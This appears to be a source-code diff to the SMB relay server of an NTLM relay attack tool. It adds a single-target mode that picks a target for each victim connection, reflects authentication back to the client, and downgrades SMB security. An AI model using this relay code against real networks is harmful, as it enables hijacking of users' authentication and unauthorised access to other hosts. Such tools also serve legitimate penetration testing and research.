@@ -118,6 +118,35 @@ class SMBRelayServer(Thread):
         respPacket['Command'] = smb3.SMB2_NEGOTIATE
         respPacket['SessionID'] = 0
 
+        # Do not use multi-target feature
+        if self.config.disableMulti:
+            if self.config.mode.upper() == 'REFLECTION':
+                self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
+
+            self.target = self.targetprocessor.getTarget()
+
+            LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'], self.target.scheme,
+                                                                                      self.target.netloc))
+
+            try:
+                if self.config.mode.upper() == 'REFLECTION':
+                    # Force standard security when doing reflection
+                    LOG.debug("Downgrading to standard security")
+                    extSec = False
+                    #recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
+                else:
+                    extSec = True
+                # Init the correct client for our target
+                client = self.init_client(extSec)
+            except Exception as e:
+                LOG.error("Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
+                self.targetprocessor.logTarget(self.target)
+            else:
+                connData['SMBClient'] = client
+                connData['EncryptionKey'] = client.getStandardSecurityChallenge()
+                smbServer.setConnectionData(connId, connData)
+
+
         if isSMB1 is False:
             respPacket['MessageID'] = recvPacket['MessageID']
         else:
@@ -175,9 +204,10 @@ class SMBRelayServer(Thread):
         #############################################################
         # SMBRelay
         # Are we ready to relay or should we just do local auth?
-        if 'relayToHost' not in connData or ('Authenticated' in connData and connData['Authenticated']):
-            # Just call the original SessionSetup
-            return self.origSmbSessionSetup(connId, smbServer, recvPacket)
+        if not self.config.disableMulti:
+            if 'relayToHost' not in connData or ('Authenticated' in connData and connData['Authenticated']):
+                # Just call the original SessionSetup
+                return self.origSmbSessionSetup(connId, smbServer, recvPacket)
 
         # We have confirmed we want to relay to the target host.
         respSMBCommand = smb3.SMB2SessionSetup_Response()
@@ -358,6 +388,8 @@ class SMBRelayServer(Thread):
         self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode ('utf-16le'),
                                     authenticateMessage['user_name'].decode ('utf-16le'))).upper ()
 
+        if self.config.disableMulti:
+            return self.origsmb2TreeConnect(connId, smbServer, recvPacket)
         # Uncommenting this will stop at the first connection relayed and won't relaying until all targets
         # are processed. There might be a use case for this
         #if 'relayToHost' in connData:
@@ -436,11 +468,46 @@ class SMBRelayServer(Thread):
     ### SMBv1 Part #################################################################
     def SmbComNegotiate(self, connId, smbServer, SMBCommand, recvPacket):
         connData = smbServer.getConnectionData(connId, checkStatus = False)
-        if (recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY) != 0:
+
+        if self.config.disableMulti:
             if self.config.mode.upper() == 'REFLECTION':
-                # Force standard security when doing reflection
-                LOG.debug("Downgrading to standard security")
-                recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
+                self.targetprocessor = TargetsProcessor(singleTarget='SMB://%s:445/' % connData['ClientIP'])
+
+            # TODO: Check if a cache is better because there is no way to know which target was selected for this victim
+            # except for relying on the targetprocessor selecting the same target unless a relay was already done
+            self.target = self.targetprocessor.getTarget()
+
+            LOG.info("SMBD-%s: Received connection from %s, attacking target %s://%s" % (connId, connData['ClientIP'],
+                                                                                         self.target.scheme, self.target.netloc))
+
+            try:
+                if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
+                    extSec = False
+                else:
+                    if self.config.mode.upper() == 'REFLECTION':
+                        # Force standard security when doing reflection
+                        LOG.debug("Downgrading to standard security")
+                        extSec = False
+                        recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
+                    else:
+                        extSec = True
+
+                # Init the correct client for our target
+                client = self.init_client(extSec)
+            except Exception as e:
+                LOG.error(
+                    "Connection against target %s://%s FAILED: %s" % (self.target.scheme, self.target.netloc, str(e)))
+                self.targetprocessor.logTarget(self.target)
+            else:
+                connData['SMBClient'] = client
+                connData['EncryptionKey'] = client.getStandardSecurityChallenge()
+                smbServer.setConnectionData(connId, connData)
+        else:
+            if (recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY) != 0:
+                if self.config.mode.upper() == 'REFLECTION':
+                    # Force standard security when doing reflection
+                    LOG.debug("Downgrading to standard security")
+                    recvPacket['Flags2'] += (~smb.SMB.FLAGS2_EXTENDED_SECURITY)
 
         return self.origSmbComNegotiate(connId, smbServer, SMBCommand, recvPacket)
         #############################################################
@@ -452,9 +519,10 @@ class SMBRelayServer(Thread):
         #############################################################
         # SMBRelay
         # Are we ready to relay or should we just do local auth?
-        if 'relayToHost' not in connData or ('Authenticated' in connData and connData['Authenticated']):
-            # Just call the original SessionSetup
-            return self.origSmbSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket)
+        if not self.config.disableMulti:
+            if 'relayToHost' not in connData or ('Authenticated' in connData and connData['Authenticated']):
+                # Just call the original SessionSetup
+                return self.origSmbSessionSetupAndX(connId, smbServer, SMBCommand, recvPacket)
 
         # We have confirmed we want to relay to the target host.
         respSMBCommand = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
@@ -677,6 +745,8 @@ class SMBRelayServer(Thread):
         self.authUser = ('%s/%s' % (authenticateMessage['domain_name'].decode ('utf-16le'),
                                     authenticateMessage['user_name'].decode ('utf-16le'))).upper ()
 
+        if self.config.disableMulti:
+            return self.smbComTreeConnectAndX(connId, smbServer, SMBCommand, recvPacket)
         # Uncommenting this will stop at the first connection relayed and won't relaying until all targets
         # are processed. There might be a use case for this
         #if 'relayToHost' in connData:
